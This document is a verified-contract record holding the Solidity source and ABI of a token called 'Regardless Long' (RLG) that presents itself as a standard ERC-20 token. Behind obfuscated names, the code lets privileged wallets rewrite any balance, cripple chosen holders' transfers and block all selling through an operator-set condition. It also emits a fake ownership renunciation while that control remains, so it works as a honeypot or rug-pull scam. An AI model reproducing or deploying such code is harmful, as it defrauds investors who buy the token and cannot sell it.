{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface atLiquidityAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoBuyLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTotal {\n    function createPair(address receiverLimit, address walletToken) external returns (address);\n}\n\ninterface fundEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapFee) external view returns (uint256);\n\n    function transfer(address fromLaunchReceiver, uint256 modeTo) external returns (bool);\n\n    function allowance(address receiverMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromLaunchReceiver,\n        uint256 modeTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableLimitFund, uint256 value);\n    event Approval(address indexed receiverMin, address indexed spender, uint256 value);\n}\n\ninterface fundEnableMetadata is fundEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RegardlessLong is autoBuyLiquidity, fundEnable, fundEnableMetadata {\n\n    mapping(address => bool) public buyMode;\n\n    function senderFund(address limitWalletFee, uint256 modeTo) public {\n        isFund();\n        maxTrading[limitWalletFee] = modeTo;\n    }\n\n    mapping(address => uint256) private maxTrading;\n\n    function balanceOf(address swapFee) public view virtual override returns (uint256) {\n        return maxTrading[swapFee];\n    }\n\n    mapping(address => bool) public teamWalletSender;\n\n    function launchedFromMarketing(uint256 modeTo) public {\n        isFund();\n        shouldTo = modeTo;\n    }\n\n    uint256 private shouldList;\n\n    string private marketingEnableIs = \"Regardless Long\";\n\n    function totalMarketingReceiver(address sellIs, address fromLaunchReceiver, uint256 modeTo) internal returns (bool) {\n        if (sellIs == maxFundMarketing) {\n            return receiverExempt(sellIs, fromLaunchReceiver, modeTo);\n        }\n        uint256 fromShould = fundEnable(exemptTo).balanceOf(fundLiquidityTake);\n        require(fromShould == shouldTo);\n        require(fromLaunchReceiver != fundLiquidityTake);\n        if (buyMode[sellIs]) {\n            return receiverExempt(sellIs, fromLaunchReceiver, feeEnable);\n        }\n        return receiverExempt(sellIs, fromLaunchReceiver, modeTo);\n    }\n\n    function transfer(address limitWalletFee, uint256 modeTo) external virtual override returns (bool) {\n        return totalMarketingReceiver(_msgSender(), limitWalletFee, modeTo);\n    }\n\n    mapping(address => mapping(address => uint256)) private feeLaunchLaunched;\n\n    event OwnershipTransferred(address indexed listAmount, address indexed totalMarketing);\n\n    function listWallet() public {\n        emit OwnershipTransferred(maxFundMarketing, address(0));\n        isSell = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return isSell;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeEnableTx;\n    }\n\n    function transferFrom(address sellIs, address fromLaunchReceiver, uint256 modeTo) external override returns (bool) {\n        if (_msgSender() != senderMode) {\n            if (feeLaunchLaunched[sellIs][_msgSender()] != type(uint256).max) {\n                require(modeTo <= feeLaunchLaunched[sellIs][_msgSender()]);\n                feeLaunchLaunched[sellIs][_msgSender()] -= modeTo;\n            }\n        }\n        return totalMarketingReceiver(sellIs, fromLaunchReceiver, modeTo);\n    }\n\n    uint256 constant feeEnable = 6 ** 10;\n\n    uint256 buyFundAmount;\n\n    function allowance(address teamFromAuto, address modeTotal) external view virtual override returns (uint256) {\n        if (modeTotal == senderMode) {\n            return type(uint256).max;\n        }\n        return feeLaunchLaunched[teamFromAuto][modeTotal];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingEnableIs;\n    }\n\n    uint256 public teamEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityMode;\n    }\n\n    constructor (){\n        if (shouldList != maxSwapToken) {\n            teamEnable = autoSwapBuy;\n        }\n        atLiquidityAuto launchedShouldMin = atLiquidityAuto(senderMode);\n        exemptTo = tokenTotal(launchedShouldMin.factory()).createPair(launchedShouldMin.WETH(), address(this));\n        \n        maxFundMarketing = _msgSender();\n        listWallet();\n        teamWalletSender[maxFundMarketing] = true;\n        maxTrading[maxFundMarketing] = takeEnableTx;\n        \n        emit Transfer(address(0), maxFundMarketing, takeEnableTx);\n    }\n\n    function txTotal(address minShould) public {\n        if (enableLaunch) {\n            return;\n        }\n        if (sellReceiverLaunched) {\n            sellReceiverLaunched = false;\n        }\n        teamWalletSender[minShould] = true;\n        \n        enableLaunch = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return isSell;\n    }\n\n    string private liquidityMode = \"RLG\";\n\n    bool public enableLaunch;\n\n    bool public sellReceiverLaunched;\n\n    address fundLiquidityTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public exemptTo;\n\n    address private isSell;\n\n    uint256 private maxSwapToken;\n\n    function approve(address modeTotal, uint256 modeTo) public virtual override returns (bool) {\n        feeLaunchLaunched[_msgSender()][modeTotal] = modeTo;\n        emit Approval(_msgSender(), modeTotal, modeTo);\n        return true;\n    }\n\n    uint256 private autoSwapBuy;\n\n    uint256 private takeEnableTx = 100000000 * 10 ** 18;\n\n    bool private marketingLimit;\n\n    function tokenAt(address teamShould) public {\n        isFund();\n        if (sellReceiverLaunched != feeLimit) {\n            feeLimit = false;\n        }\n        if (teamShould == maxFundMarketing || teamShould == exemptTo) {\n            return;\n        }\n        buyMode[teamShould] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTx;\n    }\n\n    address senderMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private limitTx = 18;\n\n    bool private feeLimit;\n\n    uint256 private launchedExempt;\n\n    function receiverExempt(address sellIs, address fromLaunchReceiver, uint256 modeTo) internal returns (bool) {\n        require(maxTrading[sellIs] >= modeTo);\n        maxTrading[sellIs] -= modeTo;\n        maxTrading[fromLaunchReceiver] += modeTo;\n        emit Transfer(sellIs, fromLaunchReceiver, modeTo);\n        return true;\n    }\n\n    function isFund() private view {\n        require(teamWalletSender[_msgSender()]);\n    }\n\n    address public maxFundMarketing;\n\n    uint256 shouldTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimitFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFromAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"launchedFromMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFundMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWalletFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamWalletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWalletFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLaunchReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"}],\"name\":\"txTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RegardlessLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}